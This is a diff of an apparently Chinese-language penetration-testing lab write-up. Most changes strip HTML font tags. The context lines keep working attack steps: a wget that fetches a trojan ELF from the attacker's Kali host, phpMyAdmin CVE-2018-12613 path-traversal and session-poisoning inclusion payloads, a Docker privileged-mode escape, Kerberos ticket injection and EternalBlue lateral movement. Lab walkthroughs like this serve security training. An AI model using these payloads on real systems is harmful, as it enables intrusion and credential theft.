@@ -192,7 +192,7 @@ ubuntu@ubuntu:~/Desktop/vulhub/phpmyadmin/CVE-2018-12613$
 
 
 
-> ## <font style="color:rgb(23, 35, 59);">Apache Struts </font>
+> ## Apache Struts 
 > [https://struts.apache.org/](https://struts.apache.org/)
 >
 >  基于 Java、遵循 MVC 模式、稳定且灵活的开发框架，它通过简化“控制器”和“视图”之间的连接，让开发者能够更高效地构建可维护的企业级动态网页应用  
@@ -237,7 +237,7 @@ ubuntu@ubuntu:~/Desktop/vulhub/phpmyadmin/CVE-2018-12613$
 
 
 
-## 2002-<font style="color:rgb(0, 0, 0);">Tomcat/8.5.19</font>
+## 2002-Tomcat/8.5.19
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454279.png)
 
@@ -307,7 +307,7 @@ ubuntu@ubuntu:~/Desktop/vulhub/phpmyadmin/CVE-2018-12613$
 
 
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">生成linux的木马，在kali本地起一个http服务方便靶机下载</font>
+生成linux的木马，在kali本地起一个http服务方便靶机下载
 
 
 
@@ -325,7 +325,7 @@ ubuntu@ubuntu:~/Desktop/vulhub/phpmyadmin/CVE-2018-12613$
 
 
 
-在`-p pwn`反弹的命令行，<font style="color:rgb(35, 57, 77);">下载shell.elf并赋权执行</font>
+在`-p pwn`反弹的命令行，下载shell.elf并赋权执行
 
 ```plain
 wget http://192.168.157.129:8000/shell.elf
@@ -422,12 +422,12 @@ meterpreter >
 
 
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">对应版本的漏洞是 CVE-2018-12613</font>
+对应版本的漏洞是 CVE-2018-12613
 
 > [https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md)
 >
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">poc: </font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">?target=db_sql.php%253f/../../../../../../../../etc/passwd</font>`
+poc: `?target=db_sql.php%253f/../../../../../../../../etc/passwd`
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454477.png)
@@ -439,46 +439,46 @@ meterpreter >
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454738.png)
 
-> **<font style="color:rgb(51, 51, 51);">原理：</font>**<font style="color:rgb(51, 51, 51);">  
-</font><font style="color:rgb(51, 51, 51);">Http 协议是一种无状态协议，即每次服务端接收到客户端的请求时，都是一个全新的请求，服务器并不知道客户端的历史请求记录；</font>
+> **原理：**  
+Http 协议是一种无状态协议，即每次服务端接收到客户端的请求时，都是一个全新的请求，服务器并不知道客户端的历史请求记录；
 >
-> <font style="color:rgb(51, 51, 51);">**Session 的主要目的就是为了弥补 Http 的无状态特性。简单的说，就是服务器可以利用 session 存储客户端在同一个会话期间的一些操作记录；</font>
+> **Session 的主要目的就是为了弥补 Http 的无状态特性。简单的说，就是服务器可以利用 session 存储客户端在同一个会话期间的一些操作记录；
 >
-> <font style="color:rgb(51, 51, 51);">** 因此这里相对应的 sql 的查询历史也会出现在 session 中，若是一句话木马出现在 session 中，那么就可以使用远程文件包含取得 shell 了。</font>
+> ** 因此这里相对应的 sql 的查询历史也会出现在 session 中，若是一句话木马出现在 session 中，那么就可以使用远程文件包含取得 shell 了。
 >
-> <font style="color:rgb(51, 51, 51);">session 常见的一些保存路径</font>
+> session 常见的一些保存路径
 >
-> <font style="color:rgb(51, 51, 51);">/var/lib/php/sess_PHPSESSID</font>
+> /var/lib/php/sess_PHPSESSID
 >
-> <font style="color:rgb(51, 51, 51);">/var/lib/php/sessions/sess_PHPSESSID</font>
+> /var/lib/php/sessions/sess_PHPSESSID
 >
-> <font style="color:rgb(51, 51, 51);">/tmp/sess_PHPSESSID</font>
+> /tmp/sess_PHPSESSID
 >
-> <font style="color:rgb(51, 51, 51);">/tmp/sessions/sess_PHPSESSID</font>
+> /tmp/sessions/sess_PHPSESSID
 >
-> `<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">session</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">文件的存储路径是分为两种情况的</font>
+> `session` 文件的存储路径是分为两种情况的
 >
-> <font style="color:rgb(51, 51, 51);">一是没有权限，默认存储在</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">/var/lib/php/sessions/</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">目录下，文件名为</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">sess_[phpsessid]</font>`<font style="color:rgb(51, 51, 51);">，而</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">phpsessid</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">在发送的请求的</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">cookie</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">字段中可以看到（一般在利用漏洞时我们自己设置</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">phpsessid</font>`<font style="color:rgb(51, 51, 51);">）</font>
+> 一是没有权限，默认存储在 `/var/lib/php/sessions/` 目录下，文件名为 `sess_[phpsessid]`，而 `phpsessid` 在发送的请求的 `cookie` 字段中可以看到（一般在利用漏洞时我们自己设置 `phpsessid`）
 >
-> <font style="color:rgb(51, 51, 51);">二是</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">phpmyadmin</font>`<font style="color:rgb(51, 51, 51);">，这时的</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">session</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">文件存储在</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">/tmp</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">目录下，需要在</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">php.ini</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">里把</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">session.auto_start</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">置为 1，把</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">session.save_path</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">目录设置为</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">/tmp</font>`
+> 二是 `phpmyadmin`，这时的 `session` 文件存储在 `/tmp` 目录下，需要在 `php.ini` 里把 `session.auto_start` 置为 1，把 `session.save_path` 目录设置为 `/tmp`
 >
-> <font style="color:rgb(51, 51, 51);">直接执行 </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">SELECT "<?php phpinfo();?>"</font>`<font style="color:rgb(51, 51, 51);">  
-</font><font style="color:rgb(51, 51, 51);">可以看到确实被保存到了 sess_sessid 中去了。</font><!-- 这是一张图片，ocr 内容为： -->
+> 直接执行 `SELECT "<?php phpinfo();?>"`  
+可以看到确实被保存到了 sess_sessid 中去了。<!-- 这是一张图片，ocr 内容为： -->
 ![Pasted image 20221006233022.png](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456273.png)<!-- 这是一张图片，ocr 内容为： -->
 ![Pasted image 20221006233046.png](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456357.png)
 >
 
-<font style="color:rgb(51, 51, 51);">  
-</font>
+  
 
-得到 phpMyAdmin 的值：<font style="color:rgb(22, 29, 28);background-color:rgb(247, 254, 251);">5b72d8a8c59d4b8df7268f33858f6de5</font>
+
+得到 phpMyAdmin 的值：5b72d8a8c59d4b8df7268f33858f6de5
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453618.png)
 
-<font style="color:rgb(35, 57, 77);"></font>
 
-<font style="color:rgb(35, 57, 77);">然后构造payload进行文件包含输出phpinfo</font>
+
+然后构造payload进行文件包含输出phpinfo
 
 `?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_5b72d8a8c59d4b8df7268f33858f6de5`
 
@@ -523,16 +523,16 @@ meterpreter >
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454277.png)
 
-### <font style="color:rgb(35, 57, 77);">privileged特权模式逃逸</font>
-> <font style="color:rgb(35, 57, 77);">docker中提供了一个</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">--privileged</font>`<font style="color:rgb(35, 57, 77);">参数，这个参数本身最初的目的是为了提供在docker中运行docker的能力  
-</font>[<font style="color:rgb(247, 83, 87);">https://www.docker.com/blog/docker-can-now-run-within-docker/</font>](https://www.docker.com/blog/docker-can-now-run-within-docker/)
+### privileged特权模式逃逸
+> docker中提供了一个`--privileged`参数，这个参数本身最初的目的是为了提供在docker中运行docker的能力  
+[https://www.docker.com/blog/docker-can-now-run-within-docker/](https://www.docker.com/blog/docker-can-now-run-within-docker/)
 >
-> <font style="color:rgb(35, 57, 77);">docker文档中对这个参数的解释如下  
-</font>[<font style="color:rgb(247, 83, 87);">https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities</font>](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)
+> docker文档中对这个参数的解释如下  
+[https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)
 >
-> <font style="color:#ED740C;background-color:rgb(246, 246, 246);">当操作员执行时docker run –privileged，Docker将启用对主机上所有设备的访问，并在AppArmor或SELinux中进行一些配置，以允许容器对主机的访问几乎与在主机上容器外部运行的进程相同。</font>
+> 当操作员执行时docker run –privileged，Docker将启用对主机上所有设备的访问，并在AppArmor或SELinux中进行一些配置，以允许容器对主机的访问几乎与在主机上容器外部运行的进程相同。
 >
-> <font style="color:rgb(35, 57, 77);">当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。那么这里就可以尝试使用特权模式写入ssh私钥，使用ssh免密登录</font>
+> 当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。那么这里就可以尝试使用特权模式写入ssh私钥，使用ssh免密登录
 >
 
 
@@ -1266,7 +1266,7 @@ meterpreter >
 
 
 
-使用 <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">psexec 并没有成功</font>
+使用 psexec 并没有成功
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455122.png)
@@ -1478,9 +1478,9 @@ C:\Users\douser\Desktop>
 
 ```
 
-<font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);"></font>
 
-<font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);"> 确认票据已注入  </font>
+
+ 确认票据已注入  
 
 ```bash
 C:\Users\douser\Desktop>klist
@@ -1618,7 +1618,7 @@ Cached Tickets: (5)
 
 
 
-#### <font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">重新开始横向移动：</font>
+#### 重新开始横向移动：
 首先用永恒之蓝连接 win7
 
 SYSTEM 权限可以读取操作系统最核心的 LSA 内存。我们要看看除了 `douser`，还有没有别的（比如域管理员）  
